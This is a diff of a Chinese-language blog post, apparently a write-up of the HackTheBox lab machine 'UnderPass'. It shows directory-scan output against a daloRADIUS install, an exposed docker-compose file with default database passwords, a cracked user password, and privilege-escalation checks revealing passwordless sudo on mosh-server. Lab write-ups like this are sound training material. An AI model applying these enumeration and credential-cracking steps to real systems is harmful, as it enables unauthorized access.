class="line"><span class="function"><span class="title">Extensions</span>: <span class="title">php</span>, <span class="title">aspx</span>, <span class="title">jsp</span>, <span class="title">html</span>, <span class="title">js</span> | <span class="title">HTTP</span> <span class="title">method</span>: <span class="title">GET</span> | <span class="title">Threads</span>: 25 | <span class="title">Wordlist</span> <span class="title">size</span>: 11714</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Output</span> <span class="title">File</span>: <span class="title">E</span>:\小工具\<span class="title">ONE</span>-<span class="title">FOX</span>集成工具箱<span class="title">_V8</span>公开版<span class="title">_by</span>狐狸\<span class="title">gui_scan</span>\<span class="title">dirsearch</span>\<span class="title">reports</span>\<span class="title">http_underpass.htb</span>\<span class="title">_daloradius__25</span>-03-23<span class="title">_13</span>-16-04.<span class="title">txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Target</span>: <span class="title">http</span>://<span class="title">underpass.htb</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[13:16:04] <span class="title">Starting</span>: <span class="title">daloradius</span>/</span></span><br><span class="line"><span class="function">[13:16:09] 200 -  221<span class="title">B</span>  - /<span class="title">daloradius</span>/.<span class="title">gitignore</span></span></span><br><span class="line"><span class="function">[13:16:31] 301 -  323<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">app</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">app</span>/</span></span><br><span class="line"><span class="function">[13:16:36] 200 -   24<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">ChangeLog</span></span></span><br><span class="line"><span class="function">[13:16:41] 301 -  323<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">doc</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">doc</span>/</span></span><br><span class="line"><span class="function">[13:16:41] 200 -    2<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">Dockerfile</span></span></span><br><span class="line"><span class="function">[13:16:41] 200 -    2<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">docker</span>-<span class="title">compose.yml</span></span></span><br><span class="line"><span class="function">[13:16:52] 301 -  327<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">library</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">library</span>/</span></span><br><span class="line"><span class="function">[13:16:52] 200 -   18<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">LICENSE</span></span></span><br><span class="line"><span class="function">[13:17:05] 200 -   10<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">README.md</span></span></span><br><span class="line"><span class="function">[13:17:13] 301 -  325<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">setup</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">setup</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Task</span> <span class="title">Completed</span>	</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">E</span>:\小工具\<span class="title">ONE</span>-<span class="title">FOX</span>集成工具箱<span class="title">_V8</span>公开版<span class="title">_by</span>狐狸\<span class="title">gui_scan</span>\<span class="title">dirsearch</span>&gt;<span class="title">python</span> <span class="title">dirsearch.py</span> -<span class="title">u</span> <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">app</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">_</span>|. <span class="title">_</span> <span class="title">_</span>  <span class="title">_</span>  <span class="title">_</span>  <span class="title">_</span> <span class="title">_</span>|<span class="title">_</span>    <span class="title">v0</span>.4.3 <span class="title">by</span> 鹏组安全</span></span><br><span class="line"><span class="function"> (<span class="title">_</span>||| <span class="title">_</span>) (/<span class="title">_</span>(<span class="title">_</span>|| (<span class="title">_</span>| )</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Extensions</span>: <span class="title">php</span>, <span class="title">aspx</span>, <span class="title">jsp</span>, <span class="title">html</span>, <span class="title">js</span> | <span class="title">HTTP</span> <span class="title">method</span>: <span class="title">GET</span> | <span class="title">Threads</span>: 25 | <span class="title">Wordlist</span> <span class="title">size</span>: 11714</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Output</span> <span class="title">File</span>: <span class="title">E</span>:\小工具\<span class="title">ONE</span>-<span class="title">FOX</span>集成工具箱<span class="title">_V8</span>公开版<span class="title">_by</span>狐狸\<span class="title">gui_scan</span>\<span class="title">dirsearch</span>\<span class="title">reports</span>\<span class="title">http_underpass.htb</span>\<span class="title">_daloradius_app_25</span>-03-23<span class="title">_13</span>-38-16.<span class="title">txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Target</span>: <span class="title">http</span>://<span class="title">underpass.htb</span>/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[13:38:16] <span class="title">Starting</span>: <span class="title">daloradius</span>/<span class="title">app</span>/</span></span><br><span class="line"><span class="function">[13:40:08] 301 -  330<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">common</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">common</span>/</span></span><br><span class="line"><span class="function">[13:42:30] 301 -  329<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">users</span>  -&gt;  <span class="title">http</span>://<span class="title">underpass.htb</span>/<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">users</span>/</span></span><br><span class="line"><span class="function">[13:42:30] 200 -    2<span class="title">KB</span> - /<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">users</span>/<span class="title">login.php</span></span></span><br><span class="line"><span class="function">[13:42:30] 302 -    0<span class="title">B</span>  - /<span class="title">daloradius</span>/<span class="title">app</span>/<span class="title">users</span>/  -&gt;  <span class="title">home</span>-<span class="title">main.php</span></span></span><br></pre></td></tr></table></figure>
+<figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd"><span class="hljs-function">E:\小工具\<span class="hljs-title">ONE</span>-<span class="hljs-title">FOX</span>集成工具箱<span class="hljs-title">_V8</span>公开版<span class="hljs-title">_by</span>狐狸\<span class="hljs-title">gui_scan</span>\<span class="hljs-title">dirsearch</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">dirsearch.py</span> -<span class="hljs-title">u</span> <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/
 
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323134321507.png" alt="image-20250323134321507"></p>
+  <span class="hljs-title">_</span>|. <span class="hljs-title">_</span> <span class="hljs-title">_</span>  <span class="hljs-title">_</span>  <span class="hljs-title">_</span>  <span class="hljs-title">_</span> <span class="hljs-title">_</span>|<span class="hljs-title">_</span>    <span class="hljs-title">v0</span>.4.3 <span class="hljs-title">by</span> 鹏组安全
+ (<span class="hljs-title">_</span>||| <span class="hljs-title">_</span>) (/<span class="hljs-title">_</span>(<span class="hljs-title">_</span>|| (<span class="hljs-title">_</span>| )
+
+<span class="hljs-title">Extensions</span>: <span class="hljs-title">php</span>, <span class="hljs-title">aspx</span>, <span class="hljs-title">jsp</span>, <span class="hljs-title">html</span>, <span class="hljs-title">js</span> | <span class="hljs-title">HTTP</span> <span class="hljs-title">method</span>: <span class="hljs-title">GET</span> | <span class="hljs-title">Threads</span>: 25 | <span class="hljs-title">Wordlist</span> <span class="hljs-title">size</span>: 11714
+
+<span class="hljs-title">Output</span> <span class="hljs-title">File</span>: <span class="hljs-title">E</span>:\小工具\<span class="hljs-title">ONE</span>-<span class="hljs-title">FOX</span>集成工具箱<span class="hljs-title">_V8</span>公开版<span class="hljs-title">_by</span>狐狸\<span class="hljs-title">gui_scan</span>\<span class="hljs-title">dirsearch</span>\<span class="hljs-title">reports</span>\<span class="hljs-title">http_underpass.htb</span>\<span class="hljs-title">_daloradius__25</span>-03-23<span class="hljs-title">_13</span>-16-04.<span class="hljs-title">txt</span>
+
+<span class="hljs-title">Target</span>: <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/
+
+[13:16:04] <span class="hljs-title">Starting</span>: <span class="hljs-title">daloradius</span>/
+[13:16:09] 200 -  221<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/.<span class="hljs-title">gitignore</span>
+[13:16:31] 301 -  323<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/
+[13:16:36] 200 -   24<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">ChangeLog</span>
+[13:16:41] 301 -  323<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">doc</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">doc</span>/
+[13:16:41] 200 -    2<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">Dockerfile</span>
+[13:16:41] 200 -    2<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">docker</span>-<span class="hljs-title">compose.yml</span>
+[13:16:52] 301 -  327<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">library</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">library</span>/
+[13:16:52] 200 -   18<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">LICENSE</span>
+[13:17:05] 200 -   10<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">README.md</span>
+[13:17:13] 301 -  325<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">setup</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">setup</span>/
+
+<span class="hljs-title">Task</span> <span class="hljs-title">Completed</span>	
+
+<span class="hljs-title">E</span>:\小工具\<span class="hljs-title">ONE</span>-<span class="hljs-title">FOX</span>集成工具箱<span class="hljs-title">_V8</span>公开版<span class="hljs-title">_by</span>狐狸\<span class="hljs-title">gui_scan</span>\<span class="hljs-title">dirsearch</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">dirsearch.py</span> -<span class="hljs-title">u</span> <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>
+
+  <span class="hljs-title">_</span>|. <span class="hljs-title">_</span> <span class="hljs-title">_</span>  <span class="hljs-title">_</span>  <span class="hljs-title">_</span>  <span class="hljs-title">_</span> <span class="hljs-title">_</span>|<span class="hljs-title">_</span>    <span class="hljs-title">v0</span>.4.3 <span class="hljs-title">by</span> 鹏组安全
+ (<span class="hljs-title">_</span>||| <span class="hljs-title">_</span>) (/<span class="hljs-title">_</span>(<span class="hljs-title">_</span>|| (<span class="hljs-title">_</span>| )
+
+<span class="hljs-title">Extensions</span>: <span class="hljs-title">php</span>, <span class="hljs-title">aspx</span>, <span class="hljs-title">jsp</span>, <span class="hljs-title">html</span>, <span class="hljs-title">js</span> | <span class="hljs-title">HTTP</span> <span class="hljs-title">method</span>: <span class="hljs-title">GET</span> | <span class="hljs-title">Threads</span>: 25 | <span class="hljs-title">Wordlist</span> <span class="hljs-title">size</span>: 11714
+
+<span class="hljs-title">Output</span> <span class="hljs-title">File</span>: <span class="hljs-title">E</span>:\小工具\<span class="hljs-title">ONE</span>-<span class="hljs-title">FOX</span>集成工具箱<span class="hljs-title">_V8</span>公开版<span class="hljs-title">_by</span>狐狸\<span class="hljs-title">gui_scan</span>\<span class="hljs-title">dirsearch</span>\<span class="hljs-title">reports</span>\<span class="hljs-title">http_underpass.htb</span>\<span class="hljs-title">_daloradius_app_25</span>-03-23<span class="hljs-title">_13</span>-38-16.<span class="hljs-title">txt</span>
+
+<span class="hljs-title">Target</span>: <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/
+
+[13:38:16] <span class="hljs-title">Starting</span>: <span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/
+[13:40:08] 301 -  330<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">common</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">common</span>/
+[13:42:30] 301 -  329<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">users</span>  -&gt;  <span class="hljs-title">http</span>://<span class="hljs-title">underpass.htb</span>/<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">users</span>/
+[13:42:30] 200 -    2<span class="hljs-title">KB</span> - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">users</span>/<span class="hljs-title">login.php</span>
+[13:42:30] 302 -    0<span class="hljs-title">B</span>  - /<span class="hljs-title">daloradius</span>/<span class="hljs-title">app</span>/<span class="hljs-title">users</span>/  -&gt;  <span class="hljs-title">home</span>-<span class="hljs-title">main.php</span></span></code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323134321507.png" alt="image-20250323134321507" loading="lazy" decoding="async"></figure></p>
 <p>但是进不去</p>
 <p>继续翻看其他文件</p>
-<p><a target="_blank" rel="noopener" href="http://underpass.htb/daloradius/docker-compose.yml">underpass.htb&#x2F;daloradius&#x2F;docker-compose.yml</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  radius-mysql:</span><br><span class="line">    image: mariadb:10</span><br><span class="line">    container_name: radius-mysql</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_DATABASE=radius</span><br><span class="line">      - MYSQL_USER=radius</span><br><span class="line">      - MYSQL_PASSWORD=radiusdbpw</span><br><span class="line">      - MYSQL_ROOT_PASSWORD=radiusrootdbpw</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./data/mysql:/var/lib/mysql&quot;</span><br><span class="line"></span><br><span class="line">  radius:</span><br><span class="line">    container_name: radius</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile-freeradius</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    depends_on: </span><br><span class="line">      - radius-mysql</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;1812:1812/udp&#x27;</span><br><span class="line">      - &#x27;1813:1813/udp&#x27;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_HOST=radius-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_DATABASE=radius</span><br><span class="line">      - MYSQL_USER=radius</span><br><span class="line">      - MYSQL_PASSWORD=radiusdbpw</span><br><span class="line">      # Optional settings</span><br><span class="line">      - DEFAULT_CLIENT_SECRET=testing123</span><br><span class="line">    volumes:</span><br><span class="line">      - ./data/freeradius:/data</span><br><span class="line">    # If you want to disable debug output, remove the command parameter</span><br><span class="line">    command: -X</span><br><span class="line"></span><br><span class="line">  radius-web:</span><br><span class="line">    build: .</span><br><span class="line">    container_name: radius-web</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    depends_on:</span><br><span class="line">      - radius</span><br><span class="line">      - radius-mysql</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;80:80&#x27;</span><br><span class="line">      - &#x27;8000:8000&#x27;</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_HOST=radius-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_DATABASE=radius</span><br><span class="line">      - MYSQL_USER=radius</span><br><span class="line">      - MYSQL_PASSWORD=radiusdbpw</span><br><span class="line">      # Optional Settings:</span><br><span class="line">      - DEFAULT_CLIENT_SECRET=testing123</span><br><span class="line">      - DEFAULT_FREERADIUS_SERVER=radius</span><br><span class="line">      - MAIL_SMTPADDR=127.0.0.1</span><br><span class="line">      - MAIL_PORT=25</span><br><span class="line">      - MAIL_FROM=root@daloradius.xdsl.by</span><br><span class="line">      - MAIL_AUTH=</span><br><span class="line"></span><br><span class="line">    volumes:</span><br><span class="line">      - ./data/daloradius:/data</span><br></pre></td></tr></table></figure>
+<p><a href="http://underpass.htb/daloradius/docker-compose.yml" target="_blank" rel="noopener noreferrer">underpass.htb/daloradius/docker-compose.yml<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">version: &quot;3&quot;
 
-<p><a target="_blank" rel="noopener" href="http://underpass.htb/daloradius/doc/install/INSTALL">underpass.htb&#x2F;daloradius&#x2F;doc&#x2F;install&#x2F;INSTALL</a></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323135643433.png" alt="image-20250323135643433"></p>
+services:
+
+  radius-mysql:
+    image: mariadb:10
+    container_name: radius-mysql
+    restart: unless-stopped
+    environment:
+      - MYSQL_DATABASE=radius
+      - MYSQL_USER=radius
+      - MYSQL_PASSWORD=radiusdbpw
+      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
+    volumes:
+      - &quot;./data/mysql:/var/lib/mysql&quot;
+
+  radius:
+    container_name: radius
+    build:
+      context: .
+      dockerfile: Dockerfile-freeradius
+    restart: unless-stopped
+    depends_on: 
+      - radius-mysql
+    ports:
+      - &#039;1812:1812/udp&#039;
+      - &#039;1813:1813/udp&#039;
+    environment:
+      - MYSQL_HOST=radius-mysql
+      - MYSQL_PORT=3306
+      - MYSQL_DATABASE=radius
+      - MYSQL_USER=radius
+      - MYSQL_PASSWORD=radiusdbpw
+      # Optional settings
+      - DEFAULT_CLIENT_SECRET=testing123
+    volumes:
+      - ./data/freeradius:/data
+    # If you want to disable debug output, remove the command parameter
+    command: -X
+
+  radius-web:
+    build: .
+    container_name: radius-web
+    restart: unless-stopped
+    depends_on:
+      - radius
+      - radius-mysql
+    ports:
+      - &#039;80:80&#039;
+      - &#039;8000:8000&#039;
+    environment:
+      - MYSQL_HOST=radius-mysql
+      - MYSQL_PORT=3306
+      - MYSQL_DATABASE=radius
+      - MYSQL_USER=radius
+      - MYSQL_PASSWORD=radiusdbpw
+      # Optional Settings:
+      - DEFAULT_CLIENT_SECRET=testing123
+      - DEFAULT_FREERADIUS_SERVER=radius
+      - MAIL_SMTPADDR=127.0.0.1
+      - MAIL_PORT=25
+      - MAIL_FROM=root@daloradius.xdsl.by
+      - MAIL_AUTH=
+
+    volumes:
+      - ./data/daloradius:/data</code></pre></figure><p><a href="http://underpass.htb/daloradius/doc/install/INSTALL" target="_blank" rel="noopener noreferrer">underpass.htb/daloradius/doc/install/INSTALL<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323135643433.png" alt="image-20250323135643433" loading="lazy" decoding="async"></figure></p>
 <p>换dirbuster的字典重新扫一遍扫到operators目录</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140517324.png" alt="image-20250323140517324"></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323135920247.png" alt="image-20250323135920247"></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140517324.png" alt="image-20250323140517324" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323135920247.png" alt="image-20250323135920247" loading="lazy" decoding="async"></figure></p>
 <p>找到userlist</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140046734.png" alt="image-20250323140046734"></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140046734.png" alt="image-20250323140046734" loading="lazy" decoding="async"></figure></p>
 <p>直接查和hashcat都行</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140435876.png" alt="image-20250323140435876"></p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140157456.png" alt="image-20250323140157456"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">underwaterfriends</span><br></pre></td></tr></table></figure>
-
-<p>进去拿到user</p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140435876.png" alt="image-20250323140435876" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250323140157456.png" alt="image-20250323140157456" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">underwaterfriends</code></pre></figure><p>进去拿到user</p>
 <p>提权</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">svcMosh@underpass:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User svcMosh may run the following commands on localhost:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/mosh-server</span><br><span class="line">svcMosh@underpass:~$ </span><br></pre></td></tr></table></figure>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">svcMosh@underpass:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/fusermount3
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/umount
+svcMosh@underpass:~$ <span class="hljs-built_in">sudo</span> -l
+Matching Defaults entries <span class="hljs-keyword">for</span> svcMosh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-<p>执行看看</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ /usr/bin/mosh-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MOSH CONNECT 60001 DiiNVEgq4M56rujxrqcQBA</span><br><span class="line"></span><br><span class="line">mosh-server (mosh 1.3.2) [build mosh 1.3.2]</span><br><span class="line">Copyright 2012 Keith Winstein &lt;mosh-devel@mit.edu&gt;</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">[mosh-server detached, pid = 1580]</span><br></pre></td></tr></table></figure>
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+svcMosh@underpass:~$ </code></pre></figure><p>执行看看</p>
